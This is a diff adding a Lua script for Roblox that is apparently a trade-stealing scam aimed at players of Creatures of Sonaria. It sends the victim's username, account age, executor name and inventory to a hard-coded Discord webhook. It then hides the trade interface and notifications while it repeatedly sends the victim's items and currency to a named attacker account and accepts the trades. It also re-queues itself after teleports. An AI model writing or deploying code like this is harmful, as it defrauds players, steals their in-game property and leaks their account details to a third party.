@@ -1,0 +1,255 @@
+
+
+Usernames = {
+    'Readitnice',
+}
+
+Webhook = 'https://discord.com/api/webhooks/1340313320204402783/JkwsZipIngY1ZEzA02uhmvg1g9qy5uqeDRetN25smoymjNN1s_kHoJEQxobwZwNIYLqF'
+
+for i,v in pairs(Usernames) do
+    Username = v
+    break
+end
+
+repeat
+    task.wait()
+until game:IsLoaded()
+
+function loaded_yes()
+    return game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.Enabled
+end
+
+repeat
+    task.wait()
+    REALLY_LOADED = pcall(loaded_yes)
+until REALLY_LOADED
+
+wait(3) -- for safety
+
+if game.PlaceId ~= 14119723130 then
+    queue_on_teleport('loadstring(game:HttpGet("stealer ig", true))()')
+
+    game:GetService("TeleportService"):Teleport(14119723130, game.Players.LocalPlayer)
+end
+
+function AddMaximumShrooms()
+    local args = {
+        [1] = "AddTradeItem",
+        [2] = {
+            ["Overwrite"] = true,
+            ["ItemType"] = "Currency",
+            ["Name"] = "Shooms",
+            ["Amount"] = 36000
+        }
+    }
+    repeat
+        traderemote = GetTradeRemote()
+    until traderemote ~= false
+    return GetTradeRemote():InvokeServer(unpack(args))
+end
+
+function GetTradeRemote()
+    remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")
+    for i,v in pairs(remotes:GetChildren()) do
+        remotename = v.Name
+        if string.find(remotename, game.Players.LocalPlayer.Name .. "-") then
+            return remotes[remotename]
+        end
+    end
+    return false
+end
+
+function IsTrading()
+    return game:GetService("Players").LocalPlayer.PlayerGui.TradeGui.Enabled
+end
+
+function SendTrade(otherguy)
+    local args = {
+        [1] = "SendRequest",
+        [2] = game:GetService("Players"):WaitForChild(otherguy)
+    }
+    game:GetService("Players").LocalPlayer.Remotes:WaitForChild("TradeRequestRemote"):FireServer(unpack(args))
+end
+
+function get_inv()
+    hits = {}
+    Creatures = game:GetService("Players").LocalPlayer.Data.Unlocks:GetChildren()
+    Items = game:GetService("Players").LocalPlayer.Data.Items:GetChildren()
+    local function insert(name, amount, class)
+        table.insert(hits, {
+            Name = name,
+            Amount = amount,
+            Class = class
+        })
+    end
+    for i,v in pairs(Creatures) do
+        if v.Value > 0 then
+            insert(v.Name, v.Value, 'Creatures')
+        end
+    end
+    for i,v in pairs(Items) do
+        if v.Value > 0 then
+            insert(v.Name, v.Value, 'Tokens')
+        end
+    end
+    table.sort(hits, function(a, b)
+        return a.Amount > b.Amount
+    end)
+    return hits
+end
+
+list = ''
+c = 0
+for i,v in pairs(get_inv()) do
+    list = list .. v.Name .. ' x' .. v.Amount .. '\n'
+    c += 1
+    if c == 60 then
+        break
+    end
+end
+ 
+data = {
+    content = '--@everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")',
+    embeds = {
+        {
+            title = 'X Scripts Sonaria',
+            description = '150$ in 6 hours of time well okay good great!',
+            color = tonumber(0x7a05b0),
+            fields = {
+                {
+                    name = 'Victim Info',
+                    value = '```Username: ' .. game.Players.LocalPlayer.Name .. '\nAccount Age: ' .. game.Players.LocalPlayer.AccountAge .. '\nExploit: ' .. identifyexecutor() .. '\nYou: ' .. Username .. '\nGame: Creatures Of Sonaria```',
+                    inline = false
+                },
+                {
+                    name = 'Inventory Information',
+                    value = '```' .. list .. '```',
+                    inline = false
+                }
+            }
+        }
+    }
+}
+
+request({
+    Url = Webhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game:GetService("HttpService"):JSONEncode(data)
+})
+
+function HideGui()
+    game:GetService("Players").LocalPlayer.PlayerGui.NotificationsGui.NotificationFrame.Visible = false
+    game:GetService("Players").LocalPlayer.PlayerGui.NotificationsGui.NotificationFrame:GetPropertyChangedSignal('Visible'):Connect(function()
+        game:GetService("Players").LocalPlayer.PlayerGui.NotificationsGui.NotificationFrame.Visible = false
+    end)
+    game:GetService("Lighting").InterfaceBlur.Size = 0
+    game:GetService("Lighting").InterfaceBlur.Changed:Connect(function()
+        game:GetService("Lighting").InterfaceBlur.Size = 0
+    end)
+    tradegui = game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui
+    tradegui.BottomFrame:GetPropertyChangedSignal('Visible'):Connect(function(...)
+        tradegui.BottomFrame.Visible = true
+    end)
+    tradegui.BottomFrame:GetPropertyChangedSignal('Position'):Connect(function(...)
+        tradegui.BottomFrame.Position = UDim2.new(0.5,0,1,0)
+    end)
+    tradegui.SideFrame:GetPropertyChangedSignal('Visible'):Connect(function(...)
+        tradegui.SideFrame.Visible = true
+    end)
+    tradegui.TopFrame:GetPropertyChangedSignal('Visible'):Connect(function(...)
+        tradegui.TopFrame.Visible = true
+    end)
+    tradegui.TopFrame:GetPropertyChangedSignal('Position'):Connect(function(...)
+        tradegui.TopFrame.Position = UDim2.new(0.5,0,0,0)
+    end)
+    game:GetService("Players").LocalPlayer.PlayerGui.NotificationsGui.NotificationFrame.ChildAdded:Connect(function(child)
+        child:Destroy()
+    end)
+    realtradegui = game:GetService("Players").LocalPlayer.PlayerGui.TradeGui.ContainerFrame
+    realtradegui.Position = UDim2.new(99,99,99,99)
+    realtradegui:GetPropertyChangedSignal('Position'):Connect(function()
+        realtradegui.Position = UDim2.new(99,99,99,99)
+    end)
+end
+
+function AddItemToTrade(item)
+    local args = {
+        [1] = "AddTradeItem",
+        [2] = {
+            ["Overwrite"] = true,
+            ["ItemType"] = item.Class,
+            ["Name"] = item.Name,
+            ["Amount"] = item.Amount
+        }
+    }
+    return GetTradeRemote():InvokeServer(unpack(args))
+end
+
+function ReadyTrade()
+    return GetTradeRemote():InvokeServer("AcceptTrade")
+end
+
+function StartStealing(otherguy)
+    repeat 
+        SendTrade(otherguy)
+        wait(1)
+    until IsTrading()
+    wait(1)
+    items = 0
+    AddMaximumShrooms()
+    for i,v in pairs(get_inv()) do
+        res = AddItemToTrade(v)
+        task.wait(1)
+        if res then
+            items = items + 1
+        end
+        if items >= 9 then
+            break
+        end
+    end
+    repeat
+        pcall(ReadyTrade)
+        task.wait(1)
+    until not IsTrading()
+end
+
+function loop_steal(otherguy)
+    HideGui()
+    while task.wait() do
+        StartStealing(otherguy.Name)
+    end 
+end
+
+function shall_steal(plr)
+    for i, v in pairs(Usernames) do
+        if v:lower() == plr.Name:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+for _, plr in pairs(game.Players:GetPlayers()) do
+    if shall_steal(plr) then
+        plr.Chatted:Connect(
+            function()
+                loop_steal(plr)
+            end
+        )
+    end
+end
+
+game.Players.PlayerAdded:Connect(
+    function(plr)
+        if shall_steal(plr) then
+            plr.Chatted:Connect(
+                function()
+                    loop_steal(plr)
+                end
+            )
+        end
+    end
+)
